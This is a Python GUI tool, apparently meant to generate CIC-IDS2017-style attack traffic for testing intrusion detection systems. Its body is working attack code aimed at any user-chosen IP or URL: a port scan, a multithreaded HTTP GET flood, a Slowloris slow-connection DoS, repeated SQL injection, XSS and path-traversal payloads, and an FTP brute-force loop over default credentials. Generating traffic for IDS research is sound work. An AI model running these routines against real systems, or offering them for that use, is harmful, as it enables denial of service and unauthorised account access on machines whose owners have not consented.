import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import socket
import requests
import time
import random

class IDSSimulatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("IDS 攻击特征模拟器 (基于 CIC-IDS2017)")
        self.root.geometry("600x550")
        
        self.is_running = False
        self.attack_thread = None

        # --- UI 布局 ---
        # 目标配置区
        config_frame = ttk.LabelFrame(root, text="目标配置")
        config_frame.pack(padx=10, pady=10, fill="x")

        ttk.Label(config_frame, text="目标 IP / URL:").grid(row=0, column=0, padx=5, pady=5, sticky="e")
        self.target_ip_var = tk.StringVar(value="127.0.0.1")
        ttk.Entry(config_frame, textvariable=self.target_ip_var, width=30).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(config_frame, text="目标端口:").grid(row=0, column=2, padx=5, pady=5, sticky="e")
        self.target_port_var = tk.StringVar(value="80")
        ttk.Entry(config_frame, textvariable=self.target_port_var, width=10).grid(row=0, column=3, padx=5, pady=5)

        ttk.Label(config_frame, text="并发线程数:").grid(row=1, column=0, padx=5, pady=5, sticky="e")
        self.threads_var = tk.StringVar(value="10")
        ttk.Entry(config_frame, textvariable=self.threads_var, width=10).grid(row=1, column=1, padx=5, pady=5, sticky="w")

        # 攻击类型选择区
        attack_frame = ttk.LabelFrame(root, text="攻击类型 (基于 IDS2017)")
        attack_frame.pack(padx=10, pady=5, fill="x")

        self.attack_type_var = tk.StringVar()
        self.attack_types = [
            "1. 端口扫描 (PortScan)",
            "2. DoS: HTTP GET 洪泛 (Hulk/GoldenEye 变种)",
            "3. DoS: Slowloris (慢速连接)",
            "4. Web 攻击: SQL注入 / XSS 探测",
            "5. 暴力破解: FTP (模拟 Patator)"
        ]
        self.attack_dropdown = ttk.Combobox(attack_frame, textvariable=self.attack_type_var, values=self.attack_types, width=50, state="readonly")
        self.attack_dropdown.current(1)
        self.attack_dropdown.pack(padx=10, pady=10)

        # 控制按钮区
        btn_frame = ttk.Frame(root)
        btn_frame.pack(padx=10, pady=5, fill="x")

        self.start_btn = ttk.Button(btn_frame, text="▶ 开始攻击模拟", command=self.start_attack)
        self.start_btn.pack(side="left", padx=20)

        self.stop_btn = ttk.Button(btn_frame, text="■ 停止", command=self.stop_attack, state="disabled")
        self.stop_btn.pack(side="left", padx=20)

        # 日志区
        log_frame = ttk.LabelFrame(root, text="运行日志")
        log_frame.pack(padx=10, pady=10, fill="both", expand=True)

        self.log_area = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, width=60, height=15)
        self.log_area.pack(padx=5, pady=5, fill="both", expand=True)
        self.log_area.configure(state='disabled')

        self.log_message("系统初始化完毕，准备就绪...")

    def log_message(self, msg):
        self.log_area.configure(state='normal')
        self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_area.see(tk.END)
        self.log_area.configure(state='disabled')

    def start_attack(self):
        target_ip = self.target_ip_var.get()
        port = int(self.target_port_var.get())
        threads = int(self.threads_var.get())
        attack_choice = self.attack_type_var.get()

        if not target_ip:
            messagebox.showerror("错误", "请输入目标IP或URL")
            return

        self.is_running = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.log_message(f"--- 开始模拟攻击: {attack_choice} ---")
        self.log_message(f"目标: {target_ip}:{port} | 线程数: {threads}")

        for i in range(threads):
            t = threading.Thread(target=self.attack_worker, args=(target_ip, port, attack_choice, i))
            t.daemon = True
            t.start()

    def stop_attack(self):
        self.is_running = False
        self.log_message("--- 正在停止所有攻击线程... ---")
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")

    def attack_worker(self, ip, port, attack_choice, thread_id):
        if "PortScan" in attack_choice:
            self.do_port_scan(ip, thread_id)
        elif "HTTP GET" in attack_choice:
            self.do_http_flood(ip, port, thread_id)
        elif "Slowloris" in attack_choice:
            self.do_slowloris(ip, port, thread_id)
        elif "Web 攻击" in attack_choice:
            self.do_web_attacks(ip, port, thread_id)
        elif "FTP" in attack_choice:
            self.do_ftp_brute(ip, port, thread_id)

    # --- 具体的攻击模块 ---

    def do_port_scan(self, ip, thread_id):
        # 模拟全连接端口扫描
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 8080]
        random.shuffle(ports)
        for p in ports:
            if not self.is_running:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex((ip, p))
                if result == 0:
                    self.log_message(f"[线程 {thread_id}] 扫描发现端口 {p} 开放")
                s.close()
                time.sleep(0.1) # 稍微延迟避免自我崩塌
            except Exception:
                pass
        self.log_message(f"[线程 {thread_id}] 端口扫描完成。")

    def do_http_flood(self, ip, port, thread_id):
        # 模拟 DoS: Hulk / GoldenEye 变种 (高频 HTTP GET)
        url = f"http://{ip}:{port}/" if not ip.startswith("http") else ip
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 10; SM-G981B)"
        ]
        req_count = 0
        while self.is_running:
            try:
                headers = {'User-Agent': random.choice(user_agents), 'Cache-Control': 'no-cache'}
                requests.get(f"{url}?rand={random.randint(1,999999)}", headers=headers, timeout=2)
                req_count += 1
                if req_count % 100 == 0:
                    self.log_message(f"[线程 {thread_id}] 已发送 {req_count} 个 HTTP GET 请求")
            except Exception:
                time.sleep(1)

    def do_slowloris(self, ip, port, thread_id):
        # 模拟 DoS: Slowloris 慢速攻击
        sockets = []
        sock_count = 50
        self.log_message(f"[线程 {thread_id}] 正在建立 {sock_count} 个 Slowloris 连接...")
        
        for _ in range(sock_count):
            if not self.is_running: return
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                s.send("User-Agent: Mozilla/5.0\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
                sockets.append(s)
            except socket.error:
                pass
        
        while self.is_running:
            for s in list(sockets):
                if not self.is_running: break
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    sockets.remove(s)
            self.log_message(f"[线程 {thread_id}] 保持着 {len(sockets)} 个慢速连接")
            time.sleep(10) # 慢速发送

    def do_web_attacks(self, ip, port, thread_id):
        # 模拟 Web 攻击: SQL 注入和 XSS
        url = f"http://{ip}:{port}/" if not ip.startswith("http") else ip
        payloads = [
            "' OR '1'='1",
            "1; DROP TABLE users",
            "<script>alert(1)</script>",
            "../../../../etc/passwd"
        ]
        while self.is_running:
            for payload in payloads:
                if not self.is_running: break
                try:
                    params = {'id': payload, 'search': payload}
                    requests.get(url, params=params, timeout=3)
                    self.log_message(f"[线程 {thread_id}] 发送 Web 恶意载荷: {payload[:15]}...")
                    time.sleep(2) # 模拟探测频率
                except Exception:
                    time.sleep(1)

    def do_ftp_brute(self, ip, port, thread_id):
        # 模拟 FTP 暴力破解 (对应 IDS2017 FTP-Patator)
        port = 21 # 强制使用 FTP 端口
        users = ["admin", "root", "ftp", "anonymous"]
        passwords = ["123456", "admin", "password", "root"]
        
        for u in users:
            for p in passwords:
                if not self.is_running: return
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((ip, port))
                    s.recv(1024) # 接收欢迎信息
                    s.send(f"USER {u}\r\n".encode())
                    s.recv(1024)
                    s.send(f"PASS {p}\r\n".encode())
                    resp = s.recv(1024).decode()
                    if "230" in resp:
                        self.log_message(f"[线程 {thread_id}] FTP 爆破成功: {u}/{p}")
                    else:
                        self.log_message(f"[线程 {thread_id}] FTP 爆破尝试: {u}/{p} 失败")
                    s.close()
                except Exception:
                    pass
                time.sleep(0.5)

if __name__ == "__main__":
    root = tk.Tk()
    app = IDSSimulatorApp(root)
    root.mainloop()
